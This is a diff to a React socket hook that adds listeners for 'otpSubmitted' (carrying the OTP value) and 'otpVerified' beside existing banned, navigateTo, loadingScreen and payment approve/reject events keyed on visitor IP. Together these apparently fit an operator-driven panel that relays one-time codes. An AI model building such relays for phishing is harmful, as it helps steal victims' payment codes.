@@ -21,6 +21,8 @@ export function useSocketSync(
     onLoadingScreen?: (data: { isActive: boolean; loadingText: string; loadingSubtext: string }) => void;
     onPaymentRejected?: () => void;
     onPaymentApproved?: () => void;
+    onOtpSubmitted?: (data: { requestId: number; otp: string }) => void;
+    onOtpVerified?: (data: { requestId: number }) => void;
   }
 ) {
   const handlersRef = useRef(handlers);
@@ -38,12 +40,16 @@ export function useSocketSync(
       handlersRef.current.onLoadingScreen?.(data);
     const onPaymentRejected = () => handlersRef.current.onPaymentRejected?.();
     const onPaymentApproved = () => handlersRef.current.onPaymentApproved?.();
+    const onOtpSubmitted = (data: { requestId: number; otp: string }) => handlersRef.current.onOtpSubmitted?.(data);
+    const onOtpVerified = (data: { requestId: number }) => handlersRef.current.onOtpVerified?.(data);
 
     socket.on("banned", onBanned);
     socket.on("navigateTo", onNavigateTo);
     socket.on("loadingScreen", onLoadingScreen);
     socket.on("paymentRejected", onPaymentRejected);
     socket.on("paymentApproved", onPaymentApproved);
+    socket.on("otpSubmitted", onOtpSubmitted);
+    socket.on("otpVerified", onOtpVerified);
 
     return () => {
       socket.off("banned", onBanned);
@@ -51,6 +57,8 @@ export function useSocketSync(
       socket.off("loadingScreen", onLoadingScreen);
       socket.off("paymentRejected", onPaymentRejected);
       socket.off("paymentApproved", onPaymentApproved);
+      socket.off("otpSubmitted", onOtpSubmitted);
+      socket.off("otpVerified", onOtpVerified);
     };
   }, [visitorIp]);
 }
